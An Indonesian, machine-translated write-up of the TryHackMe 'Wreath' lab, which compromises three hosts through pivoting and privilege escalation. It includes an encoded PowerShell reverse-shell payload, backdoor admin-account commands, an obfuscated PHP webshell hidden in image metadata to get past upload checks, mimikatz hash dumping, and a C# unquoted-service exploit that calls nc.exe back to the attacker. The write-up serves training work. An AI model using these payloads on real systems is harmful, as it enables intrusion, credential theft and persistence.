---
title: "Wreath"
description: "10.200.96.200 Nmap Nmap Jaringan Internal Port 10000 MiniServ 1.890 Eksploitasi MiniServ 1.890 Memperoleh akses permanen dengan menyalin kunci pribadi pengguna root ke Internal lokal"
lang: "id"
translationKey: "wreath"
category: "lab-writeups"
tags: ["Unique Case Winpriv", "unique case pivoting", "Antivirus Evading", "Lab", "Active Directory"]
publishDate: "2024-03-30"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "540defe4-d8d6-45ad-bc1f-1e73b8b92651"
notionUrl: "https://app.notion.com/p/Wreath-540defe4d8d645adbc1f1e73b8b92651"
notionLastEdited: "2025-02-12T14:19:00.000Z"
---

# 10.200.96.200

## Nmap

![](/images/wreath/dcfe11e99fc0.png)

Jaringan Internal Nmap

![](/images/wreath/48d10eeb2e97.png)

## Port 10000 (MiniServ 1.890)

![](/images/wreath/444dd4821df3.png)

![](/images/wreath/76371e9646cd.png)

### Eksploitasi MiniServ 1.890

![](/images/wreath/a7974b4a8cb0.png)

**Memperoleh akses permanen dengan menyalin kunci pribadi pengguna root ke lokal**

![](/images/wreath/3bbbc04acbe1.png)

![](/images/wreath/90cb12501888.png)

## Enumerasi Internal

![](/images/wreath/535799ffe6f6.png)

# Berputar

Dari enumerasi internal, kita tahu bahwa ada server IP internal yang kita dapatkan, jadi mari kita coba mengaksesnya menggunakan teknik pivoting.

![](/images/wreath/f9f9ef0a8f37.png)

Karena kita ingin memperbarui pivot, kita perlu membuka 2 port di firewall dan membuat tunnel ke Kali Linux lokal kita. Pertama, buka port dari firewall.

![](/images/wreath/31e8c3b71d17.png)

kemudian membuat terowongan untuk port tersebut menggunakan pahat

![](/images/wreath/3628876ee4c4.png)

# 10.200.96.150

## Nmap

Pemindaian port menggunakan nmap dan proxychains

![](/images/wreath/81b3c45bafc2.png)

## Port 80 (git-server)

Kami menemukan bahwa port 80 terbuka, jadi mari kita akses menggunakan browser dengan alat FoxyProxy.

![](/images/wreath/4b6f968f9842.png)

![](/images/wreath/8a7a9634f99d.png)

![](/images/wreath/6ac8bdd84ddb.png)

![](/images/wreath/4a71e445cd04.png)

### Eksploitasi git-server

![](/images/wreath/d5c309c615d2.png)

Jadi mari kita cari tahu cara membuat reverse shell, tetapi sebelum kita membuat reverse shell, kita perlu memastikan apakah target ini diizinkan untuk terhubung ke dunia luar dengan menjalankan perintah `ping` pada server yang disusupi untuk melakukan ping ke IP kita sendiri dan menggunakan interceptor jaringan (Wireshark, TCPDump, dll.) untuk melihat apakah permintaan echo ICMP berhasil masuk.

Untuk memulai listener TCPDump, kita dapat menggunakan perintah berikut:

```bash
tcpdump -i tun0 icmp
```

Sekarang, menggunakan webshell, jalankan perintah ping berikut (ganti dengan IP VPN Anda sendiri!):

```bash
ping -n 3 ATTACKING_IP
```

![](/images/wreath/692f8d6a781a.png)

Kita melihat bahwa kita tidak dapat terhubung langsung dari .150 ke Kali Linux lokal kita. Oke, pertama-tama mari kita periksa firewall dengan menggunakan perintah ini.

```bash
firewall-cmd --list-all
```

![](/images/wreath/c56ab8c58e23.png)

Pada host pertama yang kami retas, 10.200.96.200, firewalld sedang berjalan, yaitu alat manajemen firewall yang sudah terinstal sebelumnya di CentOS dan distribusi Linux berbasis Red Hat lainnya. Secara default, alat ini bersifat restriktif dan hanya mengizinkan lalu lintas ke port 22, SSH. Mari kita terapkan aturan firewall yang mengizinkan lalu lintas masuk ke port yang diinginkan (dalam kasus saya, port 22222) menggunakan protokol TCP.

```bash
firewall-cmd --zone=public --add-port 22222/tcp
```

![](/images/wreath/4721325e4a7e.png)

Selanjutnya, kita akan membuka port pada host tersebut melalui `nc -nvlp 22222` untuk mendengarkan lalu lintas masuk ke port tersebut.

Mari kita buat permintaan POST yang berisi payload PowerShell berbahaya yang memuat koneksi reverse shell ke port tersebut. Ubah nilai IP dan port ke host yang disusupi dan port yang baru dibuka. Serangan berhasil karena netcat kita menunjukkan koneksi yang berhasil dari target kita yang berakhir di mesin lokal kita.

```bash
# PIVOTING
# LOCAL KALI
chisel server --socks5 --reverse &
# TARGET
./chisel client 10.50.76.178:8080 R:socks 22222:10.50.76.178:22222 &
# REVSHELL PAYLOAD
powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwADAALgA5ADYALgAyADAAMAAiACwAMgAyADIAMgAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![](/images/wreath/b3c1a300b2da.png)

![](/images/wreath/226f7d88e16c.png)

![](/images/wreath/c96169d005e3.png)

### **Kegigihan**

Referensi : [https://pencer.io/ctf/ctf-thm-wreath/#git-server---enumeration](https://pencer.io/ctf/ctf-thm-wreath/#git-server---enumeration)

```bash
# menambahkan user baru
net user pencer Password123 /add
# menambahkan user pencer pada group admin 
net localgroup Administrators pencer /add
# menambahkan user pencer pada group Remote
net localgroup "Remote Management Users" pencer /add
```

![](/images/wreath/63434988cd7b.png)

![](/images/wreath/4890ff677676.png)

## Enumerasi Internal

Dengan menggunakan tunneling sebelumnya, kita dapat mengambil file langsung dari Kali Linux lokal kita menggunakan server Python.

![](/images/wreath/2a054d580ddb.png)

![](/images/wreath/0b6f697bd655.png)

**Mimikatz**

Masuk ke target melalui xfreerdp dan buka powershell dengan hak akses administrator lalu jalankan mimikatz untuk mendapatkan hash NTLM.

![](/images/wreath/1d733831abfb.png)

![](/images/wreath/8860b204790b.png)

Oke, sekarang kita punya 2 hash NTLM dari 2 akun di sini, yaitu:

```bash
Administrator : 37db630168e5f82aafa8461e05c6bbd1
Thomas : 02d90eda8f6b6b06c32d5f207831101f 
```

Sekarang kita berhasil memecahkan hash NTLM milik pengguna Thomas.

![](/images/wreath/e1295f4aad29.png)

Kami gagal membobol hash administrator, tetapi kami dapat menggunakan hash secara langsung menggunakan teknik pass the hash.

![](/images/wreath/6b6f4135fc84.png)

# 10.200.96.100

## **Pemindaian Port**

![](/images/wreath/b79c0c561642.png)

## Pivoting .100 (penerusan port jarak jauh)

![](/images/wreath/7312953dca08.png)

![](/images/wreath/718e4320db8e.png)

![](/images/wreath/fa6788bcaf2c.png)

![](/images/wreath/a527fde35a2b.png)

## Pivoting .100 (penerusan port lokal)

Pertama, kita perlu mengubah teknik pertama kita pada .150 menggunakan sshuttle.

```bash
sshuttle -r root@10.200.96.200 --ssh-cmd "ssh -i ~/Documents/tryhackme/wreath/id_rsa" 10.200.96.0/24 -x 10.200.96.200
```

![](/images/wreath/ca7885409489.png)

Kemudian, atur aturan firewall pada .100 menggunakan perintah untuk membuka port yang akan kita gunakan untuk tujuan tunneling:

```bash
netsh advfirewall firewall add rule name=”Chisel-tombstoneghost” dir=in action=allow protocol=tcp localport=15997
```

![](/images/wreath/c36f3bf3eb79.png)

lalu kita melakukan pembuatan terowongan di pelabuhan itu

```bash
# .150
./chisel.exe server -p 15997 — socks5
# .100
chisel client 10.200.96.150:15997 80:10.200.96.100:80
```

![](/images/wreath/fc42e42dac38.png)

![](/images/wreath/9e2041cb63f2.png)

![](/images/wreath/6a20631bd434.png)

### Enum

### Pelabuhan 80

dirsearch :

![](/images/wreath/103da331f43c.png)

Kita melihat bahwa ada folder .git yang terekspos, jadi mari kita lakukan dump menggunakan gitdumper.

![](/images/wreath/05f589776243.png)

Setelah itu, kita ekstrak file yang telah kita unduh.

![](/images/wreath/4cc778a6ffd1.png)

Kemudian kita menggunakan perintah git show untuk menampilkan semua commit yang pernah dilakukan.

![](/images/wreath/e213e16a6dc0.png)

Setelah menganalisis commit, kami menemukan bahwa ada 2 file menarik yang telah diperbarui sebelumnya. Dari kode tersebut, kita tahu bahwa kita dapat mengunggah file berbahaya ke server menggunakan fitur unggah file. Mari kita cari tahu dengan mengakses halaman tersebut.

![](/images/wreath/051af633b39f.png)

Saat mengakses halaman ini, kita akan diminta untuk memberikan kredensial. Mari kita gunakan kredensial Thomas yang telah kita peroleh di bagian sebelumnya `thomas :  i<3ruby`

![](/images/wreath/4185d2fca143.png)

Karena PHP diaktifkan di situs web, saya akan mencoba mengunggah webshell PHP atau reverse shell dan menangkapnya.

Sekarang, dengan memeriksa kode sumber, kita melihat ada beberapa validasi yang dilakukan sehingga tidak ada file berbahaya yang diunggah. Yang terjadi adalah:

1. Permintaan POST dibuat setelah tombol `upload` diklik.
1. Ada daftar ekstensi yang disebutkan (jpg, jpeg, png, gif), sehingga ekstensi lain seperti `.PHP ` tidak dapat diunggah.
1. Fungsi `file_exists()` memeriksa apakah file sudah diunggah dan jika sudah ada, koneksi akan terputus.
1. Jika file belum diunggah, proses dilanjutkan. Ada 2 pengecekan yang dilakukan, pertama ukuran atau dimensi file diperiksa untuk melihat apakah itu gambar yang valid dan kemudian ekstensi file diperiksa untuk melihat apakah memiliki salah satu ekstensi yang baik yang disebutkan sebelumnya.
1. Jika lolos semua pemeriksaan, file dipindahkan ke direktori `uploads/` dengan fungsi `move_uploaded_file()`.
1. Jika proses berakhir, pesan sukses akan ditampilkan, jika tidak, pesan gagal akan ditampilkan.
Sekarang kita harus melewati pemeriksaan tersebut untuk mengunggah reverse shell. Saya ingin mengunggah file shell PHP dan mencoba beberapa metode seperti mengubah ekstensi, menambahkan beberapa ekstensi seperti `image.php.png`, mencegat permintaan dengan Burp Suite, dan mengubah tipe MIME, tetapi tidak ada yang berhasil.

Mungkin karena pengecekan ukuran, dengan mendapatkan dimensi file, ia dapat mendeteksi bahwa saya sebenarnya tidak mengunggah gambar. Jadi kali ini saya memutuskan untuk mengunggah gambar tetapi menggunakan `exiftool`
untuk menyisipkan beberapa shell PHP dalam bentuk metadata di dalam gambar tersebut. Ini seharusnya menghilangkan masalah pengecekan ukuran. Saya juga menambahkan ekstensi `.php` di akhir agar metadata dieksekusi. Jadi saya menambahkan metadata ke gambar bernama `innocent.png` dengan exiftool dan kemudian mengubah namanya menjadi `innocent.png.php`

```bash
# generate malicious file
exiftool -Comment='<?php echo "<prev>"; system($_GET['cmd']); ?>' innocent.png
# rename malicious file
mv innocent.png innocent.png.php
```

![](/images/wreath/5fa543655bcb.png)

Pengunggahan file yang baru dibuat ini berhasil, kita mendapatkan pesan sukses.

![](/images/wreath/52ee69f10ef2.png)

Setelah berhasil mengunggah file berbahaya kita, mari kita jalankan perintah dirsearch untuk mengetahui di mana kita dapat mengakses file tersebut.

```bash
dirsearch -u http://localhost/resources/ --auth-type=basic --auth='thomas:i<3ruby'  -x 403,404,400
```

![](/images/wreath/370f1bfab1a6.png)

![](/images/wreath/0bec1f8e4da0.png)

Kita dapat menjalankan perintah "whoami" pada file kita, jadi mari kita buat revshell dari sini, tetapi sebelum itu, mari kita bersihkan output RCE kita dengan mengaburkan payload PHP kita menjadi seperti ini.

```bash
<?php $c0=$_GET[base64_decode('d3JlYXRo')];if(isset($c0)){echo base64_decode('PHByZT4=').shell_exec($c0).base64_decode('PC9wcmU+');}die();?>
```

Kemudian ulangi langkah seperti langkah sebelumnya yang telah kita lalui untuk membangun kembali RCE dan lanjutkan untuk membuat revshell.

![](/images/wreath/0904fa3d96a9.png)

![](/images/wreath/fa357c24b374.png)

## Winpriv

### Manfaatkan SeImpersonate:

![](/images/wreath/ca4d897cc605.png)

![](/images/wreath/fd37463cfecc.png)

### Manfaatkan Layanan Tanpa Kutipan:

```bash
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

![](/images/wreath/378913a102d2.png)

Jadi, mari kita lihat secara detail tentang layanan-layanan tersebut.

![](/images/wreath/273fcc06a809.png)

Selanjutnya, kita akan membuat exploit C# yang berisi kode berbahaya kita pada mesin penyerang. Kita akan mengeksploitasi jalur yang rentan untuk meluncurkan executable eksternal (`nc.exe`) dengan argumen baris perintah tertentu. Executable tersebut akan terhubung ke mesin penyerang kita (`10.50.76.178`) pada port `5555` dan mengeksekusi perintah `powershell.exe`.

```bash
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
                Process proc = new Process();
                ProcessStartInfo procInfo = new ProcessStartInfo("c:\\xampp\\htdocs\\resources\\uploads\\nc.exe", "10.50.76.178 5555 -e cmd.exe");
                procInfo.CreateNoWindow = true;
                proc.StartInfo = procInfo;
                proc.Start();
        }
    }
}
```

![](/images/wreath/17e063a9ee32.png)

Selanjutnya, kita akan mengkompilasi program yang akan membuat file yang dapat dieksekusi dengan akhiran `.exe` . Pada host yang telah kita retas, kita akan menggunakan curl untuk mengambil file yang dapat dieksekusi tersebut.

![](/images/wreath/48247b37a6da.png)

![](/images/wreath/80570ff10ed7.png)

Kami menyalin exploit kami ke jalur layanan tersebut:

![](/images/wreath/43a0970fac8b.png)

Tanpa tanda kutip di sekitar jalur tersebut, kita dapat meletakkan file .exe kita di tengah-tengahnya. Sekarang kita perlu menghentikan layanannya:

![](/images/wreath/5f7dc315a3fb.png)

Pastikan kita memiliki pendengar netcat yang menunggu di Kali, lalu mulai layanan lagi. Kita mendapatkan kesalahan karena file .exe kita bukan layanan sungguhan, namun setelah beralih ke Kali, kita melihat bahwa kita terhubung ke shell terbalik sebagai sistem:

![](/images/wreath/11836e69cac4.png)
